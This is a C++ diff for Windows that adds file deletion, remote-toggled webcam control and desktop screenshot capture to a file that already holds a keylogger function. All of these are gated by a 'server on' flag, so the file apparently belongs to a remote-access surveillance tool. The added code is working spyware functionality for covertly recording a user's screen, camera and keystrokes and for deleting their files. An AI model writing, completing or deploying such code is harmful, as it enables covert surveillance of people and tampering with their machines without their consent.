@@ -86,3 +86,70 @@ void Keylogger(bool& isKeyLoggerOn, bool &isServerOn) {
 	}
 	output.close();
 }
+bool DeleteFile(const string& filepath) {
+	if (DeleteFileA(filepath.c_str())) {
+		return true;
+	}
+	else {
+		DWORD errorCode = GetLastError(); // Lấy mã lỗi
+		if (errorCode == ERROR_ACCESS_DENIED) {
+			std::cerr << "Access Denied. Check permissions or run as administrator.\n";
+		}
+		else {
+			std::cerr << "Error deleting file: " << errorCode << std::endl;
+		}
+		return false;
+	}
+}
+void Webcam(bool& isWebcamOn, bool& isServerOn) {
+	WebcamController webcam;
+	MSG msg;
+	bool isWebcamRunning = false;
+	while (isServerOn) {
+		while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
+			TranslateMessage(&msg);
+			DispatchMessage(&msg);
+
+			if (msg.message == WM_QUIT) {
+				return;
+			}
+		}
+		if (isWebcamOn && !isWebcamRunning) {
+			webcam.startWebcam();
+			isWebcamRunning = true;
+		}
+		else if (!isWebcamOn && isWebcamRunning) {
+			webcam.stopWebcam();
+			isWebcamRunning = false;
+		}
+	}
+}
+bool CaptureScreen(){
+	const string outputFile = "_Data/screenshot.jpg";
+	int screenWidth = 1920;
+	int screenHeight = 1080;
+
+	HDC hDesktopDC = GetDC(NULL);
+
+	HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
+
+	HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, screenWidth, screenHeight);
+
+	SelectObject(hCaptureDC, hCaptureBitmap);
+
+	BitBlt(hCaptureDC, 0, 0, screenWidth, screenHeight, hDesktopDC, 0, 0, SRCCOPY);
+
+	CImage image;
+	image.Attach(hCaptureBitmap);
+	HRESULT hr = image.Save(outputFile.c_str(), Gdiplus::ImageFormatJPEG);
+
+
+	image.Detach();
+	DeleteObject(hCaptureBitmap);
+	DeleteDC(hCaptureDC);
+	ReleaseDC(NULL, hDesktopDC);
+
+	if (SUCCEEDED(hr)) return true;
+	return false;
+}
+
